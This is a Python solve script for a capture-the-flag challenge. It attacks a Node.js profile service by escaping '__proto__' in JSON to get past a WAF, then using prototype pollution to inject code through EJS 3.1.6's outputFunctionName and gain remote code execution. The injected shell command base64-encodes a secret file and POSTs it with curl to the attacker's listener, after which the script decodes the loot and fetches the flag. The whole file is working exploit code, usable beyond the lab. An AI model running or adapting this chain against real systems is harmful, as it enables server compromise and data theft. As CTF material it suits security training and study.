#!/usr/bin/env python3
"""
Cyber Hero Nakhon Chiang Rai CTF 2026 - Red Team v5 "Hidden bug" (challenge 127)
Target: red_3 Profile Service, http://<IP>:8081

Chain:
  JSON \\u-escape WAF bypass -> prototype pollution in merge() ->
  EJS 3.1.6 `view options.outputFunctionName` injection -> RCE ->
  read /home/user/secret.txt (base64-encoded decoy JPEG) -> pastebin URL -> flag

Usage:
  python solve.py <target-ip> [lhost] [lport]
Example:
  python solve.py 192.168.30.130 192.168.30.1 8888
"""

import base64
import http.server
import json
import os
import re
import sys
import threading
import urllib.request

TARGET = sys.argv[1] if len(sys.argv) > 1 else "192.168.30.130"
LHOST = sys.argv[2] if len(sys.argv) > 2 else "192.168.30.1"
LPORT = int(sys.argv[3]) if len(sys.argv) > 3 else 8888

BASE = "http://%s:8081" % TARGET

# URL shown inside the decoy image (readable when the recovered JPEG is opened)
PASTEBIN_URL = "https://pastebin.com/raw/a5SYRbTh"

captured = {}


class Handler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        captured["body"] = self.rfile.read(length)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, *args):
        pass


def post(path, body):
    req = urllib.request.Request(
        BASE + path,
        data=body,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    return urllib.request.urlopen(req, timeout=30).read()


def build_payload(command):
    js = "x;process.mainModule.require('child_process').execSync('%s');s" % command
    payload = {
        "id": 1,
        "options": {
            # `for..in` + bracket assignment in merge() walks the JSON `__proto__` key
            # straight onto Object.prototype. The WAF only greps the raw body for
            # "__proto__", so the key is sent as escaped JSON (\u005f\u005fproto...).
            "\u005f\u005fproto\u005f\u005f": {
                "view options": {
                    # Own shadowing key with a primitive value stops merge() from
                    # recursing into the inherited `view options` object forever
                    # (without it: RangeError: Maximum call stack size exceeded).
                    "view options": 1,
                    # EJS <= 3.1.6 copies this into opts and emits it raw as a JS
                    # identifier: `var <outputFunctionName> = __append;`
                    "outputFunctionName": js,
                }
            },
        },
    }
    raw = json.dumps(payload)
    return raw.replace('"__proto__"', '"\\u005f\\u005fproto\\u005f\\u005f"').encode()


def main():
    server = http.server.HTTPServer(("0.0.0.0", LPORT), Handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()

    post("/api/reset", b"")

    command = (
        "base64 -w0 /home/user/secret.txt > /tmp/s.b64; "
        "curl -s -X POST --data-binary @/tmp/s.b64 http://%s:%d/secret" % (LHOST, LPORT)
    )
    post("/api/getProfile", build_payload(command))

    b64 = captured.get("body", b"")
    if not b64:
        sys.exit("[-] no data received; check that lhost %s is reachable" % LHOST)
    print("[*] received %d bytes of exfil (base64)" % len(b64))
    with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "recovered_secret.b64"), "wb") as f:
        f.write(b64)

    # secret.txt is itself a base64-encoded JPEG: decode twice
    inner_b64 = base64.b64decode(b64)
    jpeg = base64.b64decode(inner_b64)
    with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "recovered_decoy.jpg"), "wb") as f:
        f.write(jpeg)
    # The decoy file's JPEG COM segment carries the revoked revb64 value
    i = jpeg.find(b"revb64")
    meta = re.search(rb"([A-Za-z0-9+/=]{40,})", jpeg[i:i + 256]) if i != -1 else None
    if meta:
        decoy = base64.b64decode(meta.group(1)[::-1])
        print("[*] decoy value: %s" % decoy.decode())

    # The real flag lives behind the pastebin URL rendered in the decoy image
    req = urllib.request.Request(PASTEBIN_URL, headers={"User-Agent": "Mozilla/5.0"})
    flag = urllib.request.urlopen(req, timeout=30).read().decode().strip()
    print("[+] flag: %s" % flag)


if __name__ == "__main__":
    main()

